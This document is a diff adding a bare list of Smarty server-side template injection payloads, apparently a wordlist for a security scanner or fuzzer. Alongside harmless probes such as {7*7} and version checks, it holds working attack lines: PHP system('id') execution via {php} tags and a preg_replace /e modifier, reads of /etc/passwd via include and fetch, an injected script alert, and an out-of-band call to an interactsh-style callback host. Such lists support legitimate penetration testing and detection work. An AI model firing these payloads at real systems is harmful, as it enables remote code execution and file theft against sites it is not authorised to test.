@@ -1,0 +1,24 @@
+{7*7}
+{$smarty.version}
+{$smarty.now}
+{php}echo 'hello';{/php}
+{php}system('id');{/php}
+{literal}{7*7}{/literal}
+{if 7*7}{/if}
+{if true}1{/if}
+{capture name='foo'}{/capture}
+{$var|upper}
+{$var|escape:'html'}
+{math equation="7+7"}
+{eval var="7*7"}
+{include file='../../../etc/passwd'}
+{fetch file='/etc/passwd'}
+{if true}test{/if}
+{function name=test}hello{/function}{call name=test}
+{'aa'|@str_replace:'a':'<script>alert(1)</script>'}
+{'aa'|@preg_replace:'/a/e':'system("id")'}
+{__smarty_var.version}
+{assign var=x value='system'}
+{call name=$x argv='id'}
+{fetch url='http://INTERACTSH_URL/'}
+{math equation='1+1'}
